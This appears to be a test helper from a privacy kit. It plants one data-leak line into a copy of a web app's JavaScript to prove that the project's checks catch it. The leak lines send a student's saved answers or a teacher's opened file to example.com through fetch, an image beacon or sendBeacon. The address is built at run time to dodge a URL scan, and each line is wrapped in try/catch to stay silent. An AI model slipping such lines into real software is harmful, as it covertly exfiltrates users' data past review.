#!/usr/bin/env python3
"""Plants one privacy leak in a COPY of this repository (privacy kit proof).

    python3 tests/plant_leak.py --list           # the leak names, one per line
    python3 tests/plant_leak.py <copy> <leak>    # plant one leak in <copy>

Each leak sends or keeps the reader's data at a point where the page holds it:
"save" is the student's result file as it is saved (nickname and answers),
"open" is the text of a result file the teacher opens. tests/prove-privacy.sh
plants each one in a fresh copy and requires the core tests or the browser
check to catch it.

Off-origin addresses are built at run time ("https:" + "/" + "/...") so the
boundary scan's absolute-URL check does not catch the leak before the browser
check gets its chance. Every leak is wrapped in try/catch so it cannot show up
as a page error: the check has to see the leak itself.
"""
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
OFF = '"https:" + "/" + "/example.com'

LEAKS = {
    "P1": 'fetch("data/practice-set.json?d=" + encodeURIComponent(DATA)).catch(() => null);',
    "P2": 'localStorage.setItem("leak", DATA);',
    "P3": "new Image().src = " + OFF + '/p.gif?d=" + encodeURIComponent(DATA);',
    "P4": "navigator.sendBeacon(" + OFF + '/b", DATA);',
    "P5": "fetch(" + OFF + '/p", { method: "POST", body: DATA }).catch(() => null);',
}
# where: (line the leak goes after, the expression holding the reader's data)
POINTS = {
    "save": ("  if (lastDownloadUrl) URL.revokeObjectURL(lastDownloadUrl);\n", "reply.ok.contents"),
    "open": ("    files.push({ name: file.name, text: await file.text() });\n", "files[files.length - 1].text"),
}
NAMES = [f"{leak}-{point}" for point in POINTS for leak in LEAKS]


def main(argv):
    if argv[1:] == ["--list"]:
        print("\n".join(NAMES))
        return 0
    if len(argv) != 3 or argv[2] not in NAMES:
        print(f"usage: plant_leak.py --list | plant_leak.py <copy> <{'|'.join(NAMES)}>")
        return 2
    copy = pathlib.Path(argv[1]).resolve()
    if copy == ROOT or (copy / ".git").exists():
        print(f"refusing to plant a leak in {copy}: use a copy without .git")
        return 2
    leak, point = argv[2].split("-")
    anchor, data = POINTS[point]
    app = copy / "web" / "app.js"
    text = app.read_text(encoding="utf-8")
    # A renamed anchor line must not turn every plant into a silent no-op.
    if text.count(anchor) != 1:
        print(f"anchor for {point} found {text.count(anchor)} times in {app}, expected once")
        return 1
    indent = anchor[: len(anchor) - len(anchor.lstrip())]
    line = indent + "try { " + LEAKS[leak].replace("DATA", data) + " } catch (e) { /* planted */ }\n"
    app.write_text(text.replace(anchor, anchor + line), encoding="utf-8")
    print(f"planted {argv[2]} in {app}: {line.strip()}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
